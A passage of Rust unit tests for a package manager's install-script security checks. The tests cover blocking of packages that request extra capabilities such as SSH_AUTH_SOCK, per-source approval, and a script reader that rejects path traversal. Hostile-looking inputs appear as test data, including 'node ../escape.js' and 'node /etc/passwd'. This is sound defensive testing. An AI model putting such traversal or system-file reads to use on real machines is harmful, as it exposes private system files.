        );
        let store = fake_store_at(store_root.path());
        let pkg_dir = store.package_dir("esbuild", "0.25.1");
        let script_hash =
            lpm_security::script_hash::compute_script_hash(&pkg_dir).expect("script hash");
        // Policy matches strict: the user previously approved the
        // SCRIPT (no capability extras). The capability request is
        // new since the last approval.
        let policy = rich_policy("esbuild", "0.25.1", None, Some(&script_hash));

        let installed = vec![("esbuild".to_string(), "0.25.1".to_string(), None)];

        // Widening request (non-empty passEnv → loosens_beyond
        // user bound regardless of limits).
        let widening = CapabilitySet {
            pass_env: ["SSH_AUTH_SOCK".to_string()].into_iter().collect(),
            read_project: ReadProjectMode::Narrow,
            sandbox_limits: Default::default(),
        };

        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &policy,
            &BlockedSetMetadata::default(),
            &widening,
            &UserBound::default(),
            None,
        );

        assert_eq!(
            blocked.len(),
            1,
            "capability-widening package must be blocked despite strict match"
        );
        assert_eq!(blocked[0].name, "esbuild");
        // `binding_drift = true` so approve-scripts renders the
        // "previously approved, please re-review" UX — the
        // user-accurate framing for a capability-drift case.
        assert!(
            blocked[0].binding_drift,
            "capability-drift is rendered as binding_drift so the prompt \
             says 'previously approved, please re-review'"
        );
    }

    /// Parity check: a baseline capability request (default
    /// CapabilitySet, empty UserBound) against a strict-matched
    /// package is NOT blocked. Proves the fix's "no regression
    /// for the common case" contract.
    #[test]
    fn baseline_capability_under_strict_match_does_not_block() {
        use crate::capability::{CapabilitySet, UserBound};

        let store_root = tempdir().unwrap();
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "node install.js"}),
        );
        let store = fake_store_at(store_root.path());
        let pkg_dir = store.package_dir("esbuild", "0.25.1");
        let script_hash =
            lpm_security::script_hash::compute_script_hash(&pkg_dir).expect("script hash");
        let policy = rich_policy("esbuild", "0.25.1", None, Some(&script_hash));

        let installed = vec![("esbuild".to_string(), "0.25.1".to_string(), None)];

        let blocked = compute_blocked_packages_with_metadata(
            &store,
            &installed,
            &policy,
            &BlockedSetMetadata::default(),
            &CapabilitySet::default(),
            &UserBound::default(),
            None,
        );
        assert!(
            blocked.is_empty(),
            "baseline request + strict match = not blocked"
        );
    }

    #[cfg(unix)]
    #[test]
    fn blocked_capture_keeps_same_content_sources_independently_reviewable() {
        use lpm_store::v2::link_meta::{LinkMeta, LinkMetaPlatform};
        use lpm_workspace::{ApprovalMetadata, TrustedDependencies};
        use std::sync::Arc;

        let root = tempdir().unwrap();
        let lpm_root = lpm_common::LpmRoot::from_dir(root.path());
        let store = PackageStore::from_root(&lpm_root);
        let project = root.path().join("project");
        std::fs::create_dir_all(project.join("node_modules")).unwrap();
        let links_root = root.path().join("store/v2/links");
        let integrity = "sha512-identical";
        let sources = ["directory+./fork-a", "directory+./fork-b"];
        let mut package_dirs = Vec::new();

        for (index, source) in sources.iter().enumerate() {
            let suffix = if index == 0 {
                "aaaaaaaaaaaaaaaa"
            } else {
                "bbbbbbbbbbbbbbbb"
            };
            let link_dir = links_root.join(format!("shared@1.0.0+{suffix}"));
            let package_dir = link_dir.join("node_modules/shared");
            std::fs::create_dir_all(&package_dir).unwrap();
            std::fs::write(
                package_dir.join("package.json"),
                r#"{"name":"shared","version":"1.0.0","scripts":{"install":"node install.js"}}"#,
            )
            .unwrap();
            let identity = InstalledPackageIdentity::new(
                "shared",
                "1.0.0",
                Some((*source).into()),
                Some(integrity.into()),
            );
            let source_identity = format!("{}\0content-{index}", identity.package_key().source_id);
            LinkMeta {
                schema: lpm_store::v2::LINK_META_SCHEMA_VERSION,
                graph_key: format!("shared@1.0.0+{suffix}"),
                graph_key_digest_hex: suffix.repeat(4),
                name: "shared".into(),
                version: "1.0.0".into(),
                source_identity: Some(source_identity),
                source_sri: integrity.into(),
                object_path: "objects/sha512-identical".into(),
                deps: Vec::new(),
                platform: Arc::new(LinkMetaPlatform {
                    os: "darwin".into(),
                    cpu: "arm64".into(),
                    libc: None,
                }),
                created_at: chrono::Utc::now(),
                last_referenced_at: chrono::Utc::now(),
            }
            .write_to(&link_dir)
            .unwrap();
            std::os::unix::fs::symlink(
                &package_dir,
                project.join("node_modules").join(format!("shared-{index}")),
            )
            .unwrap();
            package_dirs.push(package_dir);
        }

        let script_hash = lpm_security::script_hash::compute_script_hash(&package_dirs[0])
            .expect("fixture has an install script");
        let mut trusted = TrustedDependencies::default();
        trusted.approve_with_metadata(
            "shared",
            "1.0.0",
            ApprovalMetadata {
                source: Some(sources[0].into()),
                integrity: Some(integrity.into()),
                script_hash: Some(script_hash),
                ..Default::default()
            },
        );
        let policy = SecurityPolicy {
            trusted_dependencies: trusted,
            minimum_release_age_secs: 0,
        };
        let installed = sources
            .iter()
            .map(|source| {
                InstalledPackageIdentity::new(
                    "shared",
                    "1.0.0",
                    Some((*source).into()),
                    Some(integrity.into()),
                )
            })
            .collect::<Vec<_>>();
        let baseline_index = lpm_store::V2BaselineIndex::for_project(&project, &lpm_root).unwrap();

        let blocked = compute_blocked_packages_with_metadata_and_baseline(
            &store,
            &installed,
            &policy,
            &BlockedSetMetadata::default(),
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
            BlockedPackageComputationExtras {
                advisor_approvals: None,
                execution_exclusions: None,
                baseline_index: Some(&baseline_index),
            },
        );

        assert_eq!(blocked.len(), 1);
        assert_eq!(blocked[0].source.as_deref(), Some(sources[1]));
    }

    #[test]
    fn blocked_capture_does_not_substitute_v1_coordinates_for_a_missing_v2_identity() {
        let root = tempdir().unwrap();
        let lpm_root = lpm_common::LpmRoot::from_dir(root.path());
        let store = PackageStore::from_root(&lpm_root);
        let coordinate_dir = store.package_dir("shared", "1.0.0");
        std::fs::create_dir_all(&coordinate_dir).unwrap();
        std::fs::write(
            coordinate_dir.join("package.json"),
            r#"{"name":"shared","version":"1.0.0","scripts":{"install":"node install.js"}}"#,
        )
        .unwrap();
        let installed = [InstalledPackageIdentity::new(
            "shared",
            "1.0.0",
            Some("registry+https://registry.example".into()),
            Some("sha512-exact".into()),
        )];
        let baseline_index = lpm_store::V2BaselineIndex::default();

        let blocked = compute_blocked_packages_with_metadata_and_baseline(
            &store,
            &installed,
            &SecurityPolicy::default_policy(),
            &BlockedSetMetadata::default(),
            &crate::capability::CapabilitySet::default(),
            &crate::capability::UserBound::default(),
            BlockedPackageComputationExtras {
                advisor_approvals: None,
                execution_exclusions: None,
                baseline_index: Some(&baseline_index),
            },
        );

        assert!(blocked.is_empty());
    }

    // ── Referenced-script file reader ────────

    fn write_file(dir: &Path, rel: &str, content: &str) {
        let path = dir.join(rel);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).unwrap();
        }
        std::fs::write(path, content).unwrap();
    }

    #[test]
    fn collect_referenced_scripts_reads_simple_install_js() {
        let dir = tempfile::tempdir().unwrap();
        write_file(dir.path(), "install.js", "console.log('hi');\n");
        let refs = collect_referenced_scripts(dir.path(), "node install.js");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].0, "install.js");
        assert_eq!(refs[0].1, "console.log('hi');\n");
    }

    #[test]
    fn collect_referenced_scripts_reads_nested_path() {
        let dir = tempfile::tempdir().unwrap();
        write_file(dir.path(), "scripts/install.js", "body");
        let refs = collect_referenced_scripts(dir.path(), "node scripts/install.js");
        assert_eq!(refs.len(), 1);
        assert_eq!(refs[0].0, "scripts/install.js");
        assert_eq!(refs[0].1, "body");
    }

    #[test]
    fn collect_referenced_scripts_rejects_escaping_path() {
        // The `..` segment is rejected by `is_safe_relative_path`
        // before any file I/O happens.
        let dir = tempfile::tempdir().unwrap();
        let refs = collect_referenced_scripts(dir.path(), "node ../escape.js");
        assert!(refs.is_empty(), "escaping path must not be read");
    }

    #[test]
    fn collect_referenced_scripts_rejects_absolute_path() {
        let dir = tempfile::tempdir().unwrap();
        let refs = collect_referenced_scripts(dir.path(), "node /etc/passwd");
        assert!(refs.is_empty());
    }

    #[test]
    fn collect_referenced_scripts_rejects_compound_body() {
        // Only the bare two-token `node <path>` shape extracts a
        // path; compound bodies fall through to no referenced
        // scripts (the model sees the body alone).
        let dir = tempfile::tempdir().unwrap();
        write_file(dir.path(), "install.js", "ok");
        let refs = collect_referenced_scripts(dir.path(), "node install.js && echo done");
        assert!(refs.is_empty());
    }

    #[test]
    fn collect_referenced_scripts_rejects_binary_file() {
        // A NUL byte in the head pushes the file out of the embed
        // path — most pure-JS install scripts are NUL-free; a NUL
        // byte means a compiled binary or an obfuscation attempt.
        let dir = tempfile::tempdir().unwrap();
        write_file(dir.path(), "install.js", "before\x00after");
        let refs = collect_referenced_scripts(dir.path(), "node install.js");
        assert!(
            refs.is_empty(),
            "binary content must not be embedded in the prompt"
        );
    }

    #[test]
    fn collect_referenced_scripts_truncates_at_cap_with_marker() {
        let dir = tempfile::tempdir().unwrap();
        // Build a body 2x the cap, all ASCII so the boundary walk
        // never matters.
        let big = "a".repeat(REFERENCED_SCRIPT_MAX_BYTES * 2);
        write_file(dir.path(), "install.js", &big);
        let refs = collect_referenced_scripts(dir.path(), "node install.js");
        assert_eq!(refs.len(), 1);
        let content = &refs[0].1;
        assert!(
            content.len() <= REFERENCED_SCRIPT_MAX_BYTES + 64,
            "truncated content must be within cap + marker length, got {}",
            content.len()
        );
        assert!(
            content.contains("[truncated for prompt context]"),
            "truncation marker missing"
        );
    }

    #[test]
    fn collect_referenced_scripts_skips_missing_file() {
        let dir = tempfile::tempdir().unwrap();
        let refs = collect_referenced_scripts(dir.path(), "node install.js");
        assert!(refs.is_empty(), "missing file = no referenced scripts");
    }

    #[test]
    fn collect_referenced_scripts_requires_js_extension() {
        let dir = tempfile::tempdir().unwrap();
        write_file(dir.path(), "install", "ok");
        let refs = collect_referenced_scripts(dir.path(), "node install");
        assert!(refs.is_empty(), "extensionless path must not be embedded");
    }
}
